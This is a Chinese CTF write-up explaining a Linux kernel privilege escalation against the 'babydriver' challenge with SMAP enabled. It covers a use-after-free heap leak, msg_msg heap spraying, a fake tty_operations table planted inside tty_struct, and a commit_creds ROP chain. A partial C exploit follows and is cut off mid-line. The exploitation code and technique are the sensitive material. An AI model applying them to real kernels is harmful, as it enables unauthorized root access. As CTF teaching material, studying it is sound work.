---
title: Kernel PWN-开启smap保护的babydrive
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458498982&idx=2&sn=bc108408437309cdee3a654dff730d44&chksm=b18e872c86f90e3adfdc7ea68c8ee2a5bf68a759c123ac037047b32138eb153b5b9a8593c74d&scene=58&subscene=0#rd
source: 看雪学苑
date: 2023-03-22
fetch_date: 2025-10-04T10:15:49.104469
---

# Kernel PWN-开启smap保护的babydrive

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HdUDPR6COKHKbA9naRibNxwFhKQuiaibwDCFUMWJ68dZrY0fCoH9SHJIGwIQTQVBBhqKGRKSibtoFv6g/0?wx_fmt=jpeg)

# Kernel PWN-开启smap保护的babydrive

patekblue

看雪学苑

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8F4l3BrXtPTLpwwichDThU6tOnsm2nChpHM8GDzjPicrTqhmGYxZZTEzt3veNDkK6TicK2AHhwREibYHA/640?wx_fmt=jpeg)

本文为看雪论坛优秀文章

看雪论坛作者ID：patekblue

##

```
一

开启smap
```

由于原本的babydrive启动脚本里，没有开启smap，所以内核可以访问用户态的数据，因此我们才能够将fake\_tty\_operation和我们的rop布置到用户态。可是当我们开启了smap保护之后，内核态就没有办法访问用户态的数据，此时当我们再hijack tty\_operation到我们的用户态时，我们的kernel就会panic，更别说劫持执行流到用户态上执行rop了。

此时就需要我们想一个办法，把fake\_tty\_operation布置到内核空间并且还得再布置一个rop，除此之外还得知道布置的内核位置在哪。

##

##

```
二

msg_msg
```

那么如何往内核里面丢垃圾呢，这里有一个选择就是喷他一发msg\_msg

msg\_msg在linux 中用于进程之间通讯，在msgget函数调用后，会创建一条消息队列在内核空间中会创建一个 msg\_queue 结构体，在调用msgsnd时就会发送一条msg的消息到指定队列上。

当我们调用msgsnd时，在linux内核中会调用do\_msgsnd。

```
static long do_msgsnd(int msqid, long mtype, void __user *mtext,                size_t msgsz, int msgflg){        struct msg_queue *msq;        struct msg_msg *msg;        int err;        struct ipc_namespace *ns;        DEFINE_WAKE_Q(wake_q);         ns = current->nsproxy->ipc_ns;         if (msgsz > ns->msg_ctlmax || (long) msgsz < 0 || msqid < 0)                return -EINVAL;        if (mtype < 1)                return -EINVAL;         msg = load_msg(mtext, msgsz);.....}
```

在经过两个检验后，就会调用load\_msg，跟进该函数。

```
struct msg_msg *load_msg(const void __user *src, size_t len){        struct msg_msg *msg;        struct msg_msgseg *seg;        int err = -EFAULT;        size_t alen;         msg = alloc_msg(len);        if (msg == NULL)                return ERR_PTR(-ENOMEM);         alen = min(len, DATALEN_MSG);        if (copy_from_user(msg + 1, src, alen))                goto out_err;         for (seg = msg->next; seg != NULL; seg = seg->next) {                len -= alen;                src = (char __user *)src + alen;                alen = min(len, DATALEN_SEG);                if (copy_from_user(seg + 1, src, alen))                        goto out_err;        }         err = security_msg_msg_alloc(msg);        if (err)                goto out_err;         return msg; out_err:        free_msg(msg);        return ERR_PTR(err);}
```

可以看到调用alloc\_msg后会调用copy\_from\_user来将用户的信息复制进内核里。而alloc\_msg里：

```
static struct msg_msg *alloc_msg(size_t len){        struct msg_msg *msg;        struct msg_msgseg **pseg;        size_t alen;         alen = min(len, DATALEN_MSG);        msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);        if (msg == NULL)                return NULL;         msg->next = NULL;        msg->security = NULL;         len -= alen;        pseg = &msg->next;        while (len > 0) {                struct msg_msgseg *seg;                 cond_resched();                 alen = min(len, DATALEN_SEG);                seg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);                if (seg == NULL)                        goto out_err;                *pseg = seg;                seg->next = NULL;                pseg = &seg->next;                len -= alen;        }         return msg; out_err:        free_msg(msg);        return NULL;}
```

会根据用户发送的msg大小来调用kmalloc申请内存。因此，借助msg\_msg我们可以实现任意大小的分配内核空间，并且可以控制该空间除去msg头（0x30）大小外的所有内存内容（这不就是堆。

##

##

```
三

再看babydrive
```

###

### **Leak heap**

由于我们拥有了一个朴实无华的UAF，并且可以通过对驱动的交互来实现对该指针指向的内存空间进行读写操作。

当我们free掉一个object时，该object内就会有下一个空闲object的地址，因此我们可以leak出该freelist的地址。
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F4l3BrXtPTLpwwichDThU6tSgrrHdZlvzsibfTIaZJN687ugTLAib1j0uGe1SMSpdLosz8oKxo7dFXw/640?wx_fmt=png)

可以看到rdi寄存器这就是当前还存有空闲object的freelist，在后续的申请中，我们也是有机会取出这里面的object的。

在freelist上的object，都会存在一个指针指向下一个空闲的object，下图就是：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8F4l3BrXtPTLpwwichDThU6tVjNUef1aQgMYPwP86sLSg2gOBU17C6GevInKyAuljJFolLsibwdNmug/640?wx_fmt=jpeg)

因此当我们在free掉原本的object时，再读里面的内容，就能轻轻松松的leak出来heap\_addr。

###

### **复用tty\_struct布置tty\_operation**

上文中提到，开启smap后，内核无法直接访问用户态的数据，因此这时候我们的tty\_operation也需要布置到内核空间，才能成功的在对tty设备操作时调用到我们布置的gadget。

在这里鼠鼠我由于比较懒，不想再喷一次msg\_msg，于是突发奇想，想到能不能利用tty\_struct里没有数据的地方来布置我们的tty\_operation，这样就不用再喷一次，难为一个刚入门kernel的lese了（笑）。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8F4l3BrXtPTLpwwichDThU6tVULjZpRJHKRBzF7iaZorJwO2BZsMk9mOCoXtvshcicz77dmHViauKFibKQ/640?wx_fmt=jpeg)

可以看到原本tty\_struct前面的部分是如此，在tty\_struct+0x1a0的地方，鼠鼠我找到了一块没数据的地方。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8F4l3BrXtPTLpwwichDThU6tDkWv0M1pbo758oicbRS5dlpmdwjSyfvJZ6Hs5GSE9kavXVkCZ4Veyuw/640?wx_fmt=jpeg)

于是鼠鼠计划把我的fake\_tty\_operation写到这里，利用题目中baby\_write函数，把fake tty struct和fake tty operation一次性写进去，一炮双响，完成hijack tty operation和在内核空间布置fake tty operation的壮举。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8F4l3BrXtPTLpwwichDThU6t3PK7fmKzVj8byicF3vyiamTZaFY2hFLDqYlScxw9x6pE4MibdCgqONkYA/640?wx_fmt=png)

效果如图。

###

### **利用msgsnd布置rop**

从上文对msgsnd函数的分析，我们可以利用msgsnd来布置rop链，于此同时由于我们已经leak 了freelist上的地址，所以可以多次使用msgsnd发送合适size的消息，就有机会拿到已知地址的freelist上的object并且往里面写入rop链子，并且由于有freelist地址，再配合鼠鼠我找到的pop rsp； ret；这条gadget，就能直接跳到rop上，完成get root。

利用msgsnd布置rop时发生了一些鼠鼠目前没搞明白的东西，但是为了避免大家看鼠鼠的水文摸不着头脑，就小提一嘴。

我的rop链如下：

```
rop[i++] = *(size_t*)"patekblue";   rop[i++] = pop_rdi_ret;   rop[i++] = init_cred;   rop[i++] = commit_cred;// rop[i++] = *(size_t*)"patekblue";//   rop[i++] = (size_t)usr;   rop[i++] = swapgs_pop_rbp_ret;   rop[i++] = *(size_t*)"patekblue";   rop[i++] = iretq_ret;    rop[i++] = (size_t)getshell;   rop[i++] = user_cs;   rop[i++] = user_rflags;   rop[i++] = user_sp;   rop[i++] = user_ss;
```

而用msgsnd后，我的rop第一条和第二条会断开。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8F4l3BrXtPTLpwwichDThU6t7TyVRc2GQzyBBVR41YY8ibWhFYzBqsrib8tmX5QxJmpvuGVWUGp2cOIA/640?wx_fmt=jpeg)

鼠鼠对源码的理解很浅，所以也不明白为什么会如此，有明白为什么的师傅可以教教0r2。

##

##

```
四

Exp
```

由于鼠鼠的堆喷实属刚入门，水平低下，所以写出来的exp内核布局不稳定，qemu启动后建议直接运行exp拿root权限，如果用了一些命令行的话，exp就可能会寄。

```
#define _GNU_SOURCE#include <unistd.h>#include <fcntl.h>#include <stdio.h>#include <stdlib.h>#include <string.h>#include <sys/mman.h>#include <sched.h>#include <sys/types.h>#include <sys/ipc.h>#include <sys/msg.h>size_t user_cs, user_ss, user_rflags, user_sp;size_t commit_cred = 0xffffffff810a1420;size_t init_cred = 0xffffffff81e48c60;size_t mov_rsp_rax_dnc_ebx_ret = 0xffffffff8181bfc5;size_t pop_rax = 0xffffffff8100ce6e;size_t swapgs_pop_rbp_ret = 0xffffffff81063694;size_t iretq_ret = 0xffffffff814e35ef;size_t pop_rdi_ret = 0xffffffff810d238d;size_t mov_rc4_rdi_pop_rbp_ret = 0xffffffff81004d80;size_t pop_rsp_ret = 0xffffffff81171045;size_t leak[0x60];size_t fake_tty[0x200];int fd1;char meiyongde[10];int  fd3;void info(char *s , size_t address ){    if (address) printf("\033[32m\033[1m[Info] %s : \033[0m%#lx\n", s, address);    else printf("\033[32m\033[1m[Info] %s \033[0m\n", s);}  void usr(){  void (*commit) (char*) = commit_cred;(*commit)(init_cred);  }  void save_status(){   __asm__(        "mov user_cs, cs;"        "mov user_ss, ss;"        "mov user_sp, rsp;"        "pushf;"        "pop user_rflags;"    );    info("status saved!",0);  }void getshell(){   info("root!!!!!!",0);   system("/bin/sh");  }   void bind_cpu(int core){    cpu_set_t cpu_set;     CPU_ZERO(&cpu_set);    CPU_SET(core, &cpu_set);    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);} int main(){   int ret = 0;    cpu_set_t cpu_set;    CPU_ZERO(&cpu_set);    CPU_SET(0, &cpu_set);    sched_setaffinity(0, sizeof(cpu_set), &cpu_set);    int ms_qid[0x100];    save_status();    fd1=open("/dev/babydev",2);    int fd2=open("/dev/babydev",2);    ioctl(fd2,0x10001,0x2e0);    close(fd2);     info("try to read heapadd",0);    read(fd1,leak,0x60);    info("try to write heapadd",0);    info("heapadd",leak[0]);    fd3=open("/dev/ptmx",2);    size_t fake_ktty_add;    size_t rop[0x20];    int i =0;    fake_ktty_add = (size_t*)leak[0];    fake_ktty_add = fake_ktty_add+0x800;    info("check tty add",fake_ktty_add);         rop[i++] = *(size_t*)"patekblue";    rop[i++] = pop_rdi_ret;    rop[i++] = init_cred;    rop[i++] = commi...